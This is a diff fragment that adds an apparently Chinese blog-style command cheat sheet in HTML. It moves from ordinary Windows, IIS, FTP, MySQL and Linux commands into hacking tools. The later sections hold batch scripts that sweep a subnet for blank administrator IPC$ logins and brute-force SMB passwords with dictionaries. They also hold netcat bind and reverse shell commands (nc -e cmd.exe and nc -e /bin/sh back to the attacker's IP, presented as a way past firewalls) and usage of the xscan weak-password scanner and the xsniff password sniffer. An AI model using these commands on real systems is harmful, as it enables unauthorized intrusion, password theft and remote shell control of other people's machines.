+<code class="language-plaintext highlighter-rouge">REM</code> 文本内容 在批处理文件中添加注解</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netsh</code> 查看或更改本地网络配置情况</li>
+</ul>
+
+<h3 id="iis服务命令">IIS服务命令</h3>
+<hr>
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /reboot</code> 重启win2k计算机（但有提示系统将重启信息出现）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /start</code> 或stop 启动（停止）所有Internet服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /restart</code> 停止然后重新启动所有Internet服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /status</code> 显示所有Internet服务状态</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /enable或disable</code> 在本地系统上启用（禁用）Internet服务的重新启动</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /rebootonerror</code> 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /noforce</code> 若无法停止Internet服务，将不会强制终止Internet服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">iisreset /timeout</code>  Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
+    <h3 id="ftp-命令后面有详细说明内容">FTP 命令：(后面有详细说明内容)</h3>
+    <hr>
+    <p>ftp的命令行格式为:</p>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ftp －v －d －i －n －g[主机名] －v</code> 显示远程服务器的所有响应信息。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">－d </code>使用调试方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">－n</code> 限制ftp的自动登录,即不使用.netrc文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">－g</code> 取消全局文件名。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">help [命令] </code>或 <code class="language-plaintext highlighter-rouge">？[命令] </code>查看命令说明</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bye</code> 或 <code class="language-plaintext highlighter-rouge">quit</code> 终止主机FTP进程,并退出FTP管理方式.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">pwd</code> 列出当前远端主机目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">put</code> 或 <code class="language-plaintext highlighter-rouge">send</code> 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">get</code> 或 <code class="language-plaintext highlighter-rouge">recv  [远程主机文件名]  [下载到本地后的文件名] </code>从远端主机中传送至本地主机中</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mget [remote-files]</code> 从远端主机接收一批文件至本地主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mput local-files </code>将本地主机中一批文件传送至远端主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">dir </code>或 <code class="language-plaintext highlighter-rouge">ls [remote-directory] [local-file]</code> 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ascii</code> 设定以ASCII方式传送文件(缺省值)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bin</code> 或 <code class="language-plaintext highlighter-rouge">image</code> 设定以二进制方式传送文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bell</code> 每完成一次文件传送,报警提示</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cdup</code> 返回上一级目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">close</code> 中断与远程服务器的ftp会话(与open对应)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">open host[port] </code>建立指定ftp服务器连接,可指定连接端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">delete</code> 删除远端主机中的文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mdelete [remote-files]</code> 删除一批文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mkdir directory-name</code> 在远端主机中建立目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rename [from] [to]</code> 改变远端主机中的文件名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rmdir directory-name</code> 删除远端主机中的目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">status</code> 显示当前FTP的状态</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">system</code> 显示远端主机系统类型</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">user user-name [password] [account]</code> 重新以别的用户名登录远端主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">open host [port]</code> 重新建立一个新的连接</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">prompt</code> 交互提示模式</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">macdef</code> 定义宏命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">lcd</code> 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">chmod</code> 改变远端主机的文件权限</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">case</code> 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cd remote－dir</code> 进入远程主机目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cdup</code> 进入远程主机目录的父目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">! </code>在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</li>
+</ul>
+
+<h3 id="mysql-命令">MYSQL 命令</h3>
+<hr>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">mysql -h主机地址 -u用户名  -p密码</code> 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。
+（例：<code class="language-plaintext highlighter-rouge">mysql -h110.110.110.110 -Uroot -P123456</code> 注:u与root可以不用加空格，其它也一样）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">exit</code> 退出MYSQL</li>
+  <li><code class="language-plaintext highlighter-rouge">mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</code></li>
+  <li>
+<code class="language-plaintext highlighter-rouge">grant select on 数据库.* to 用户名@登录主机 identified by "密码"</code>; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">show databases</code>; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">use mysql</code>  进入MySQL指令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">show tables</code>  显示库中的数据表</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">describe</code> 表名; 显示数据表的结构</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">create database 库名</code>; 建库</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">use 库名</code>；使用该数据库</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">create table</code> 表名 (字段设定列表)； 建表</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">drop database</code> 库名;</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">drop table</code> 表名； 删库和删表</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">delete from</code> 表名; 将表中记录清空</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">select * from</code> 表名; 显示表中的记录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mysqldump --opt school&gt;school.bbb</code> 备份数据库：
+（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</li>
+</ul>
+
+<h3 id="win2003系统下新增命令实用部份">win2003系统下新增命令（实用部份）：</h3>
+<hr>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">shutdown /参数 </code>关闭或重启本地或远程主机。
+参数说明：<code class="language-plaintext highlighter-rouge">/S</code> 关闭主机，<code class="language-plaintext highlighter-rouge">/R</code> 重启主机，<code class="language-plaintext highlighter-rouge">/T</code>数字设定延时的时间，范围0～180秒之间，<code class="language-plaintext highlighter-rouge"> /A</code>取消开机，<code class="language-plaintext highlighter-rouge">/M //IP</code> 指定的远程主机。
+例：<code class="language-plaintext highlighter-rouge">shutdown /r /t 0</code> 立即重启本地主机（无延时）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">taskill /参数 进程名或进程的pid</code> 终止一个或多个任务和进程。
+参数说明：<code class="language-plaintext highlighter-rouge">/PID</code> 要终止进程的<code class="language-plaintext highlighter-rouge">pid</code>,可用<code class="language-plaintext highlighter-rouge">tasklist</code>命令获得各进程的<code class="language-plaintext highlighter-rouge">pid</code>，<code class="language-plaintext highlighter-rouge">/IM</code> 要终止的进程的进程名，<code class="language-plaintext highlighter-rouge">/F</code> 强制终止进程，<code class="language-plaintext highlighter-rouge">/T</code> 终止指定的进程及他所启动的子进程。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tasklist</code> 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。
+参数说明：<code class="language-plaintext highlighter-rouge">/M</code> 列出当前进程加载的dll文件，<code class="language-plaintext highlighter-rouge">/SVC</code> 显示出每个进程对应的服务，无参数时就只列出当前的进程。</li>
+</ul>
+
+<h3 id="linux系统下基本命令注要区分大小写">Linux系统下基本命令　注：要区分大小写</h3>
+<hr>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">uname</code> 显示版本信息（同win2K的 ver）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">dir</code> 显示当前目录文件, <code class="language-plaintext highlighter-rouge">ls -al</code> 显示包括隐藏文件（同win2K的 dir）
+<code class="language-plaintext highlighter-rouge">pwd</code> 查询当前所在的目录位置。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cd ..</code> 回到上一层目录，注意<code class="language-plaintext highlighter-rouge">cd</code> 与<code class="language-plaintext highlighter-rouge">..</code>之间有空格。<code class="language-plaintext highlighter-rouge">cd　/</code>返回到根目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cat</code>  文件名 查看文件内容</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cat &gt;abc.txt</code> 往abc.txt文件中写上内容。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">more</code> 文件名 以一页一页的方式显示一个文本文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cp</code> 复制文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mv</code> 移动文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rm</code> 文件名 删除文件，rm -a 目录名删除目录及子目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mkdir</code> 目录名 建立目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rmdir</code> 删除子目录，目录内没有文档。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">chmod</code> 设定档案或目录的存取权限</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">grep</code> 在档案中查找字符串</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">diff</code> 档案文件比较</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">find</code> 档案搜寻</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">date</code> 现在的日期、时间</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">who</code> 查询目前和你使用同一台机器的人以及Login时间地点</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">w</code> 查询目前上机者的详细资料</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">whoami</code> 查看自己的帐号名称</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">groups</code> 查看某人的Group</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">passwd</code> 更改密码</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">history</code> 查看自己下过的命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ps</code> 显示进程状态</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">kill</code> 停止某进程</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">gcc</code> 黑客通常用它来编译C语言写的文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">su</code> 权限转换为指定使用者</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">telnet IP telnet</code>连接对方主机（同win2K），当出现bash$时就说明连接成功。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ftp ftp</code>连接上某服务器（同win2K）</li>
+</ul>
+
+<h3 id="批处理命令与变量">批处理命令与变量</h3>
+<hr>
+<h4 id="for命令及变量-基本格式">for命令及变量 基本格式</h4>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">FOR /</code>参数 <code class="language-plaintext highlighter-rouge">%variable IN (set) DO command [command_parameters] %variable:</code>指定一个单一字母可替换的参数，如：<code class="language-plaintext highlighter-rouge">%i</code> ，而指定一个变量则用：<code class="language-plaintext highlighter-rouge">%%i</code> ，而调用变量时用：<code class="language-plaintext highlighter-rouge">%i%</code> ，变量是区分大小写的（%i 不等于 %I）。
+批处理每次能处理的变量从<code class="language-plaintext highlighter-rouge">%0—%9</code>共10个，其中<code class="language-plaintext highlighter-rouge">%0</code>默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：<code class="language-plaintext highlighter-rouge">net use ipipc$ pass /user:user </code>中<code class="language-plaintext highlighter-rouge">ip</code>为<code class="language-plaintext highlighter-rouge">%1</code>,pass为<code class="language-plaintext highlighter-rouge">%2</code> ,user为<code class="language-plaintext highlighter-rouge">%3</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">(set):</code>指定一个或一组文件，可使用通配符，如：<code class="language-plaintext highlighter-rouge">(D:user.txt)</code>和<code class="language-plaintext highlighter-rouge">(1 1 254)(1 -1 254),{“(1 1 254)”}</code>第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1;</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">command: </code> 指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">command_parameters: </code>为特定命令指定参数或命令行开关</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">IN (set)</code>:指在<code class="language-plaintext highlighter-rouge">(set)</code>中取值；<code class="language-plaintext highlighter-rouge">DO command</code> ：指执行command</li>
+  <li>参数：<code class="language-plaintext highlighter-rouge">/L</code>指用增量形式{ (set)为增量形式时 }；<code class="language-plaintext highlighter-rouge">/F</code>指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。</li>
+</ul>
+
+<p>用法举例：</p>
+<pre><code class="language-CMD">@echo off
+echo 用法格式：test.bat *.*.* &gt; test.txt
+for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \%1.%%G /user:administrator | find "命令成功完成" &gt;&gt;test.txt
+</code></pre>
+<p>存为test.bat 说明：
+ 对指定的一个C类网段的254个IP依次试建立administrator密码为空的<code class="language-plaintext highlighter-rouge">IPC$</code>连接，如果成功就把该IP存在test.txt中。
+　　<code class="language-plaintext highlighter-rouge">/L</code>指用增量形式（即从1-254或254-1）；输入的IP前面三位：<code class="language-plaintext highlighter-rouge">*.*.*</code>为批处理默认的 <code class="language-plaintext highlighter-rouge">%1</code>；<code class="language-plaintext highlighter-rouge">%%G</code>为变量(ip的最后一位）；&amp; 用来隔开<code class="language-plaintext highlighter-rouge">echo</code>和<code class="language-plaintext highlighter-rouge">net use</code>这二个命令；<code class="language-plaintext highlighter-rouge">|</code> 指建立了<code class="language-plaintext highlighter-rouge">ipc$</code>后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</p>
+<pre><code class="language-cmd">　　@echo off
+　　echo 用法格式：ok.bat ip
+　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200
+</code></pre>
+<p>　　存为：ok.exe 说明：输入一个IP后，用字典文件<code class="language-plaintext highlighter-rouge">d:pass.dic</code>来暴解<code class="language-plaintext highlighter-rouge">d:user.dic</code>中的用户密码，直到文件中值取完为止。<code class="language-plaintext highlighter-rouge">%%i</code>为用户名；<code class="language-plaintext highlighter-rouge">%1</code>为输入的IP地址（默认）。
+　</p>
+<h3 id="if命令及变量-基本格式">if命令及变量 基本格式</h3>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">IF [not] errorlevel 数字 命令语句</code> 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。
+例：<code class="language-plaintext highlighter-rouge">IF errorlevel 0 命令 </code>指程序执行后返回的值为0时，就值行后面的命令；<code class="language-plaintext highlighter-rouge">IF not errorlevel 1 命令</code>指程序执行最后返回的值不等于1，就执行后面的命令。
+0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">IF [not] 字符串1==字符串2 命令语句</code> 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。
+例：<code class="language-plaintext highlighter-rouge">if "%2%"=="4" goto start</code>指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就<code class="language-plaintext highlighter-rouge">%</code>变量名<code class="language-plaintext highlighter-rouge">%</code>并加<code class="language-plaintext highlighter-rouge">" "</code>）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">IF [not] exist 文件名 命令语句</code> 如果指定的文件名存在，就执行后面的命令。
+例：<code class="language-plaintext highlighter-rouge">if not nc.exe goto end</code>指：如果没有发现nc.exe文件就跳到”:end”标签处。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">IF [not] errorlevel 数字 命令语句 else 命令语句</code>或 <code class="language-plaintext highlighter-rouge">IF [not] 字符串1==字符串2 命令语句 else 命令语句</code>或<code class="language-plaintext highlighter-rouge"> IF [not] exist 文件名 命令语句 else 命令语句 </code>加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有<code class="language-plaintext highlighter-rouge">del</code>命令时需把<code class="language-plaintext highlighter-rouge">del</code>命令全部内容用<code class="language-plaintext highlighter-rouge">&lt; &gt;</code>括起来，因为<code class="language-plaintext highlighter-rouge">del</code>命令要单独一行时才能执行，用上<code class="language-plaintext highlighter-rouge">&lt; &gt;</code>后就等于是单独一行了；例如：<code class="language-plaintext highlighter-rouge">if exist test.txt. &lt;del test.txt.&gt; else echo test.txt.missing </code>，注意命令中的<code class="language-plaintext highlighter-rouge">.</code>
+    <h3 id="系统外部命令">系统外部命令</h3>
+    <blockquote>
+      <p>注：系统外部命令(均需下载相关工具)</p>
+    </blockquote>
+  </li>
+</ul>
+
+<h4 id="瑞士军刀ncexe">瑞士军刀：<code class="language-plaintext highlighter-rouge">nc.exe</code>
+</h4>
+<h5 id="参数说明">参数说明：</h5>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">-h</code> 查看帮助信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-d</code> 后台模式</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-e prog</code> 程序重定向，一但连接就执行[危险]</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-i secs</code> 延时的间隔</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-l</code> 监听模式，用于入站连接</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-L</code> 监听模式，连接天闭后仍然继续监听，直到CTR+C</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-n IP地址</code>，不能用域名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-o film</code>记录16进制的传输</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-p [空格] 端口</code> 本地端口号</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-r</code> 随机本地及远程端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-t</code> 使用Telnet交互方式</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-u</code> UDP模式</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-v</code> 详细输出，用-vv将更详细</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-w</code> 数字 timeout延时间隔</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-z</code> 将输入，输出关掉（用于扫锚时）</li>
+  <li>
+    <h5 id="基本用法">基本用法：</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -nvv 192.168.0.1 80 </code> 连接到192.168.0.1主机的80端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -l -p 80</code> 开启本机的TCP 80端口并监听</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -nvv -w2 -z 192.168.0.1 80-1024</code> 扫锚<code class="language-plaintext highlighter-rouge">192.168.0.1</code>的<code class="language-plaintext highlighter-rouge">80-1024</code>端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -l -p 5354 -t -e c:winntsystem32cmd.exe</code> 绑定<code class="language-plaintext highlighter-rouge">remote</code>主机的<code class="language-plaintext highlighter-rouge">cmdshell</code>在<code class="language-plaintext highlighter-rouge">remote</code>的<code class="language-plaintext highlighter-rouge">TCP 5354</code>端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354</code> 梆定<code class="language-plaintext highlighter-rouge">remote</code>主机的<code class="language-plaintext highlighter-rouge">cmdshell</code>并反向连接<code class="language-plaintext highlighter-rouge">192.168.0.2</code>的<code class="language-plaintext highlighter-rouge">5354</code>端口
+    <h5 id="高级用法">高级用法：</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -L -p 80 </code>作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -L -p 80 &gt; c:log.txt</code> 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -L -p 80 &lt; c:honeyport.txt</code> 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">type.exe c:honeyport | nc -L -p 80 </code>作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用
+本机上用：<code class="language-plaintext highlighter-rouge">nc -l -p 本机端口</code>
+在对方主机上用：<code class="language-plaintext highlighter-rouge">nc -e cmd.exe 本机IP -p 本机端口 </code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nc -e /bin/sh 本机IP -p 本机端口 </code>linux,unix 反向连接突破对方主机的防火墙
+本机上用：<code class="language-plaintext highlighter-rouge">nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</code>
+在对方主机上用：<code class="language-plaintext highlighter-rouge">nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 </code>传送文件到对方主机
+    <blockquote>
+      <p>备 注：</p>
+    </blockquote>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">| </code>管道命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">&lt; </code>或<code class="language-plaintext highlighter-rouge"> &gt;</code> 重定向命令。<code class="language-plaintext highlighter-rouge">&lt;</code>，例如：<code class="language-plaintext highlighter-rouge">tlntadmn &lt; test.txt</code> 指把test.txt的内容赋值给tlntadmn命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">@</code> 表示执行<code class="language-plaintext highlighter-rouge">@</code>后面的命令，但不会显示出来（后台执行）；例：<code class="language-plaintext highlighter-rouge">@dir c:winnt &gt;&gt; d:log.txt</code> 意思是：后台执行<code class="language-plaintext highlighter-rouge">dir</code>，并把结果存在<code class="language-plaintext highlighter-rouge">d:log.txt</code>中</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">&gt;</code>与<code class="language-plaintext highlighter-rouge">&gt;&gt;</code>的区别 <code class="language-plaintext highlighter-rouge">&gt;</code>指：覆盖；<code class="language-plaintext highlighter-rouge">&gt;&gt;</code>指：保存到(添加到）。如：<code class="language-plaintext highlighter-rouge">@dir c:winnt &gt;&gt; d:log.txt</code>和<code class="language-plaintext highlighter-rouge">@dir c:winnt &gt; d:log.txt</code>二个命令分别执行二次比较看：用<code class="language-plaintext highlighter-rouge">&gt;&gt;</code>的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</li>
+</ul>
+
+<h3 id="扫描工具xscanexe">扫描工具：xscan.exe</h3>
+
+<h4 id="基本格式">基本格式</h4>
+<hr>
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] </code>扫锚”起始IP到终止IP”段的所有主机信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] </code>扫锚”主机IP列表文件名”中的所有主机信息
+    <h5 id="检测项目">检测项目</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-active</code> 检测主机是否存活</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-os</code> 检测远程操作系统类型（通过NETBIOS和SNMP协议）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-port</code> 检测常用服务的端口状态</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-ftp</code> 检测FTP弱口令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-pub</code> 检测FTP服务匿名用户写权限</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-pop3</code> 检测POP3-Server弱口令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-smtp</code> 检测SMTP-Server漏洞</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-sql</code> 检测SQL-Server弱口令</li>
+  <li>
+    <ul>
+      <li>
+<code class="language-plaintext highlighter-rouge">-smb</code> 检测NT-Server弱口令</li>
+    </ul>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-iis</code> 检测IIS编码/解码漏洞</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-cgi</code> 检测CGI漏洞</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-nasl</code> 加载Nessus攻击脚本</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-all</code> 检测以上所有项目</li>
+  <li>
+    <p><em>其它选项:</em></p>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-i</code> 适配器编号 设置网络适配器, 可通过"-l"参数获取适配器编号&gt;</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-l</code> 显示所有网络适配器</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-v</code> 显示详细扫描进度</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-p</code> 跳过没有响应的主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-o</code> 跳过没有检测到开放端口的主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-t</code> 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-log</code> 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
+    <h5 id="用法示例">用法示例</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xscan -host 192.168.1.1-192.168.255.255 -all -active -p　</code>检测<code class="language-plaintext highlighter-rouge">192.168.1.1-192.168.255.255</code>网段内主机的所有漏洞，跳过无响应的主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o </code>检测<code class="language-plaintext highlighter-rouge">192.168.1.1-192.168.255.255</code>网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xscan -file hostlist.txt -port -cgi -t 200,5 -v -o </code>检测<code class="language-plaintext highlighter-rouge">hostlist.txt</code>文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
+    <h3 id="命令行方式嗅探器-xsniffexe">命令行方式嗅探器: xsniff.exe</h3>
+    <h4 id="可捕获局域网内ftpsmtppop3http协议密码">可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</h4>
+    <h5 id="参数说明-1">参数说明:</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-tcp</code> 输出TCP数据报</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-udp</code> 输出UDP数据报</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-icmp</code> 输出ICMP数据报</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-pass</code> 过滤密码信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-hide</code> 后台运行</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-host</code> 解析主机名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-addr IP地址</code> 过滤IP地址</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-port 端口</code> 过滤端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-log 文件名</code> 将输出保存到文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-asc</code> 以ASCII形式输出</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-hex</code> 以16进制形式输出</li>
